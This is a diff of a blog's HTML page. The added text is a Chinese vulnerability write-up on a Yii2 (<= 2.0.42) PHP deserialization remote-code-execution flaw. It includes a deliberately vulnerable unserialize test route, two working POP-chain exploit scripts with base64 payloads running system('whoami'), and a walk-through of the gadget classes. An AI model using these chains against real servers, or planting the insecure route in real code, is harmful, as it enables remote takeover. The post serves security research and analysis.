@@ -107,7 +107,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="漏洞分析,">
 
 
 
@@ -120,13 +120,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Tyaoo&#39;s Blog">
-<meta property="og:url" content="https://tyaoo.github.io/archives/2020/02/index.html">
+<meta name="description" content="Yii2 &amp;lt;= 2.0.42 反序列化RCE">
+<meta name="keywords" content="漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yii2最新反序列化POP链分析">
+<meta property="og:url" content="https://tyaoo.github.io/2021/06/03/Yii2最新反序列化POP链分析/index.html">
 <meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="Yii2 &amp;lt;= 2.0.42 反序列化RCE">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106040200d261d2fda84de853a1e7.png">
+<meta property="og:updated_time" content="2021-06-03T18:11:15.931Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tyaoo&#39;s Blog">
+<meta name="twitter:title" content="Yii2最新反序列化POP链分析">
+<meta name="twitter:description" content="Yii2 &amp;lt;= 2.0.42 反序列化RCE">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png">
 
 
 
@@ -156,13 +164,13 @@
 
 
 
-  <link rel="canonical" href="https://tyaoo.github.io/archives/2020/02/">
+  <link rel="canonical" href="https://tyaoo.github.io/2021/06/03/Yii2最新反序列化POP链分析/">
 
 
 
 
 
-  <title>归档 | Tyaoo's Blog</title>
+  <title>Yii2最新反序列化POP链分析 | Tyaoo's Blog</title>
   
 
 
@@ -181,7 +189,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -297,141 +305,363 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
 
-      <span class="archive-page-counter">
-        
-        
-         
-        
-        OK! 目前共计 32 篇日志。 继续努力。
-      </span>
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2021/06/03/Yii2最新反序列化POP链分析/">
 
-      
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
 
         
         
+          <h1 class="post-title" itemprop="name headline">Yii2最新反序列化POP链分析</h1>
         
 
-        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-03T23:09:56+08:00">
+                2021-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2020">2020</h1>
-          </div>
-        
-        
 
-        
+          
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/02/29/2020-GYCTF-Web/" itemprop="url">
-              
-                <span itemprop="name">2020 GYCTF Web</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-02-29T11:55:07+08:00" content="2020-02-29">
-          02-29
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
 
+        </div>
+      </header>
+    
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/02/28/upload-labs/" itemprop="url">
-              
-                <span itemprop="name">upload-labs</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-02-28T22:02:16+08:00" content="2020-02-28">
-          02-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <blockquote>
+<p>Yii2 &lt;= 2.0.42</p>
+<p>反序列化RCE</p>
+</blockquote>
+<a id="more"></a>
 
-        
-        
+<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><pre><code class="cmd">composer create-project --prefer-dist yiisoft/yii2-app-basic yii2</code></pre>
+<p>把目录放到网站下，访问<code>http://127.0.0.1/yii2/web</code>即可</p>
+<p>然后在<code>controllers/SiteController.php</code>文件下添加我们的测试路由：</p>
+<pre><code class="php">public function actionTest()
+{
+    return unserialize(base64_decode($_GET[&quot;data&quot;]));
+}</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="php">&lt;?php
 
-        
+namespace Faker;
+class DefaultGenerator{
+    protected $default ;
+    function __construct($argv)
+    {
+        $this-&gt;default = $argv;
+    }
+}
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+class ValidGenerator{
+    protected $generator;
+    protected $validator;
+    protected $maxRetries;
+    function __construct($command,$argv)
+    {
+        $this-&gt;generator = new DefaultGenerator($argv);
+        $this-&gt;validator = $command;
+        $this-&gt;maxRetries = 99999999;
+    }
+}
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/02/28/sqli-labs/" itemprop="url">
-              
-                <span itemprop="name">sqli-labs</span>
-              
-            </a>
-        
-      </h2>
+namespace Codeception\Extension;
+use Faker\ValidGenerator;
+class RunProcess{
+    private $processes = [];
+    function __construct($command,$argv)
+    {
+        $this-&gt;processes[] = new ValidGenerator($command,$argv);
+    }
+}
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-02-28T21:58:56+08:00" content="2020-02-28">
-          02-28
-        </time>
-      </div>
+$exp = new RunProcess(&#39;system&#39;,&#39;whoami&#39;);
+echo(base64_encode(serialize($exp)));
 
-    </header>
-  </article>
+# TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEyOiIAKgBnZW5lcmF0b3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6Njoid2hvYW1pIjt9czoxMjoiACoAdmFsaWRhdG9yIjtzOjY6InN5c3RlbSI7czoxMzoiACoAbWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</code></pre>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png" alt="image-20210603224742097" style="zoom:67%;">
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>入口点在<code>vendor/codeception/codeception/ext/RunProcess.php</code>的<code>__destruct</code>方法中</p>
+<pre><code class="php">class RunProcess extends Extension
+{
+    public function __destruct()
+    {
+        $this-&gt;stopProcess(); // 漏洞入口
+    }
+
+    public function stopProcess()
+    {
+        foreach (array_reverse($this-&gt;processes) as $process) {
+            /** @var $process Process  **/
+            if (!$process-&gt;isRunning()) { // 不存在isRunning()方法，调用__call()方法
+                continue;
+            }
+            $this-&gt;output-&gt;debug(&#39;[RunProcess] Stopping &#39; . $process-&gt;getCommandLine());
+            $process-&gt;stop();
+        }
+        $this-&gt;processes = [];
+    }</code></pre>
+<p>触发<code>vendor/fakerphp/faker/src/Faker/ValidGenerator.php</code>的<code>__call()</code>方法</p>
+<pre><code class="php">class ValidGenerator
+{
+    public function __call($name, $arguments)
+    {
+        $i = 0;
+        do {
+            $res = call_user_func_array([$this-&gt;generator, $name], $arguments); // $name为isRunning，$arguments为空，我们可以通过另一个类的__call()函数返回指定值
+            ++$i;
+            if ($i &gt; $this-&gt;maxRetries) {
+                throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
+            }
+        } while (!call_user_func($this-&gt;validator, $res)); // 命令执行
+
+        return $res;
+    }</code></pre>
+<p>上面的<code>call_user_func_array()</code>方法可以利用<code>vendor/fakerphp/faker/src/Faker/DefaultGenerator.php</code>中的<code>__call()</code>方法返回自定义值</p>
+<pre><code class="php">class DefaultGenerator
+{
+    public function __call($method, $attributes)
+    {
+        return $this-&gt;default; // 传入需要执行的命令
+    }</code></pre>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>Yii2的补丁大都是直接加一个<code>__wakeup()</code>禁止反序列化，即黑名单过滤，跟着作者的思路，自己也搜索了一下<code>__call()</code>，然后定位到下面的<code>UniqueGenerator</code>类，和上面用到的<code>ValidGenerator</code>类很相似</p>
+<pre><code class="php">namespace Faker;
+class UniqueGenerator
+{
+    public function __call($name, $arguments)
+    {
+        if (!isset($this-&gt;uniques[$name])) {
+            $this-&gt;uniques[$name] = [];
+        }
+        $i = 0;
+
+        do {
+            $res = call_user_func_array([$this-&gt;generator, $name], $arguments); // $res可控
+            ++$i;
+
+            if ($i &gt; $this-&gt;maxRetries) {
+                throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a unique value&#39;, $this-&gt;maxRetries));
+            }
+        } while (array_key_exists(serialize($res), $this-&gt;uniques[$name])); // 调用了serialize()方法，可以触发__sleep()方法
+        $this-&gt;uniques[$name][serialize($res)] = null;
+
+        return $res;
+    }</code></pre>
+<p>可以用到之前就已经被挖掘出来的<code>LazyString</code>的Gadget</p>
+<pre><code class="php">namespace Symfony\Component\String;
+class LazyString implements \Stringable, \JsonSerializable
+{
+    public function __sleep(): array
+    {
+        $this-&gt;__toString();
+
+        return [&#39;value&#39;];
+    }</code></pre>
+<p>给出最后的exp</p>
+<pre><code class="php">&lt;?php
+
+namespace yii\rest
+{
+    class IndexAction{
+        function __construct()
+        {
+            $this-&gt;checkAccess = &#39;system&#39;;
+            $this-&gt;id = &#39;whoami&#39;;
+        }
+    }
+}
+
+namespace Symfony\Component\String
+{
+    use yii\rest\IndexAction;
+    class LazyString
+    {
+        function __construct()
+        {
+            $this-&gt;value = [new indexAction(), &quot;run&quot;];
+        }
+    } 
+    class UnicodeString{
+        function __construct()
+        {
+            $this-&gt;value = new LazyString();
+        }
+    }
+}
+
+namespace Faker
+{
+    use Symfony\Component\String\LazyString;
+    class DefaultGenerator
+    {
+        function __construct()
+        {
+            $this-&gt;default = new LazyString();
+        }
+    }
+
+    class UniqueGenerator
+    {
+        function __construct()
+        {
+            $this-&gt;generator = new DefaultGenerator();
+            $this-&gt;maxRetries = 99999999;
+        }
+
+    }
+}
+
+namespace Codeception\Extension
+{
+    use Faker\UniqueGenerator;
+    class RunProcess
+    {
+        function __construct()
+        {
+            $this-&gt;processes[] = new UniqueGenerator();
+        }
+    }
+}
+
+namespace
+{
+    use Codeception\Extension\RunProcess;
+    $exp = new RunProcess();
+    echo(base64_encode(serialize($exp)));
+}
+
+# TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6OToicHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIxOiJGYWtlclxVbmlxdWVHZW5lcmF0b3IiOjI6e3M6OToiZ2VuZXJhdG9yIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjc6ImRlZmF1bHQiO086MzU6IlN5bWZvbnlcQ29tcG9uZW50XFN0cmluZ1xMYXp5U3RyaW5nIjoxOntzOjU6InZhbHVlIjthOjI6e2k6MDtPOjIwOiJ5aWlccmVzdFxJbmRleEFjdGlvbiI6Mjp7czoyOiJpZCI7czo2OiJ3aG9hbWkiO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjY6InN5c3RlbSI7fWk6MTtzOjM6InJ1biI7fX19czoxMDoibWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</code></pre>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106040200d261d2fda84de853a1e7.png" alt="image-20210604020055359" style="zoom:67%;">
 
 
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9420" target="_blank" rel="noopener">Yii2反序列化RCE 新POP链</a></p>
+<p><a href="https://www.anquanke.com/post/id/217929" target="_blank" rel="noopener">Yii反序列化分析</a></p>
 
       
-
     </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/05/28/Laravel-Debug-mode-RCE复现/" rel="next" title="Laravel Debug mode RCE复现">
+                <i class="fa fa-chevron-left"></i> Laravel Debug mode RCE复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -439,6 +669,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -459,8 +693,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -530,6 +773,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装环境"><span class="nav-number">1.</span> <span class="nav-text">安装环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">4.</span> <span class="nav-text">补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -681,6 +940,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
